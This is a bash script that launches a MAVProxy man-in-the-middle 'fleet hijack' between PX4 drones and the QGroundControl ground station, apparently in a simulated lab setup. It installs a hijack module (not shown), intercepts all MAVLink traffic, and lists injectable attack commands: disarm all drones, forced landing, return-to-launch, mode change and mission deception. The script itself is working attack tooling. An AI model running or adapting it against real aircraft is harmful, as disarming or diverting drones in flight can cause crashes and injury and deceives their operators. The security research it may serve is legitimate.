#!/bin/bash
# launch_mitm.sh — MAVProxy MITM between PX4 drones and QGC
#
# HOW IT WORKS:
#   1. MAVProxy connects to each PX4 drone directly (ports 18570/71/72)
#   2. MAVProxy pushes all traffic to QGC on Windows (172.25.0.1:14550)
#   3. QGC does NOT need a CommLink — MAVProxy pushes to it directly
#   4. The hijack module observes all traffic and injects on command
#
# BEFORE RUNNING:
#   1. Launch PX4 with 3 drones (as usual)
#   2. DISCONNECT QGC from the drones (remove WSL_Swarm CommLink or disconnect)
#   3. Run this script
#   4. QGC will auto-detect the incoming MAVLink stream on port 14550
#
# USAGE:
#   chmod +x launch_mitm.sh
#   ./launch_mitm.sh          # 3 drones (default)
#   ./launch_mitm.sh 1        # 1 drone
#   ./launch_mitm.sh 2        # 2 drones

set -e

NUM_DRONES=${1:-3}
DRONE_IP="172.25.12.121"
GCS_IP="172.25.0.1"
GCS_PORT="14550"

echo "════════════════════════════════════════════════════════"
echo "  MAVProxy MITM Fleet Hijack Setup"
echo "  Drones: ${NUM_DRONES} @ ${DRONE_IP}"
echo "  QGC:    ${GCS_IP}:${GCS_PORT}"
echo "════════════════════════════════════════════════════════"
echo ""

# ── Step 1: Install MAVProxy if needed ──────────────────────
if ! python3 -c "import MAVProxy" 2>/dev/null; then
    echo "[*] Installing MAVProxy..."
    pip3 install MAVProxy --break-system-packages -q
    echo "[+] MAVProxy installed."
else
    echo "[+] MAVProxy already installed."
fi

# ── Step 2: Find MAVProxy modules directory ─────────────────
MAVPROXY_DIR=$(python3 -c "import MAVProxy; import os; print(os.path.dirname(MAVProxy.__file__))" 2>/dev/null)

if [ -z "$MAVPROXY_DIR" ]; then
    echo "[!] Cannot find MAVProxy directory. Aborting."
    exit 1
fi

MODULES_DIR="${MAVPROXY_DIR}/modules"
echo "[+] MAVProxy modules dir: ${MODULES_DIR}"

# ── Step 3: Install hijack module ───────────────────────────
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
HIJACK_SRC="${SCRIPT_DIR}/mavproxy_hijack.py"

if [ ! -f "$HIJACK_SRC" ]; then
    echo "[!] mavproxy_hijack.py not found in ${SCRIPT_DIR}"
    echo "    Make sure mavproxy_hijack.py is in the same folder as this script."
    exit 1
fi

cp "$HIJACK_SRC" "${MODULES_DIR}/mavproxy_hijack.py"
echo "[+] Hijack module installed to ${MODULES_DIR}/"

# ── Step 4: Build MAVProxy command ──────────────────────────
CMD="mavproxy.py"

# Connect to each drone
for i in $(seq 1 $NUM_DRONES); do
    PORT=$((18569 + i))
    CMD="${CMD} --master=udpout:${DRONE_IP}:${PORT}"
    echo "[*] Connecting to drone ${i}: udpout:${DRONE_IP}:${PORT}"
done

# Push traffic to QGC — this means QGC does NOT need to connect,
# MAVProxy sends the data directly to QGC's listening port
CMD="${CMD} --out=udp:${GCS_IP}:${GCS_PORT}"
echo "[*] Pushing to QGC: udp:${GCS_IP}:${GCS_PORT}"

# Options
CMD="${CMD} --source-system=254"   # MAVProxy sysid (neutral)
CMD="${CMD} --mav20"               # Force MAVLink v2
CMD="${CMD} --load-module=hijack"  # Auto-load hijack module

echo ""
echo "════════════════════════════════════════════════════════"
echo "  Starting MAVProxy..."
echo ""
echo "  Once started, in the MAVProxy console type:"
echo ""
echo "    hijack status    ← wait until drones appear here"
echo "    hijack rtl       ← ATTACK: fleet RTL"
echo "    hijack land      ← ATTACK: forced landing"
echo "    hijack disarm    ← ATTACK: disarm all"
echo "    hijack mode HOLD ← ATTACK: set mode"
echo "    hijack mission   ← ATTACK: mission deception"
echo "    hijack start     ← ATTACK: RTL + mission deception"
echo ""
echo "  NOTE: Make sure QGC is open on Windows."
echo "        QGC will auto-detect the stream on port 14550."
echo "════════════════════════════════════════════════════════"
echo ""

# ── Step 5: Launch ───────────────────────────────────────────
eval $CMD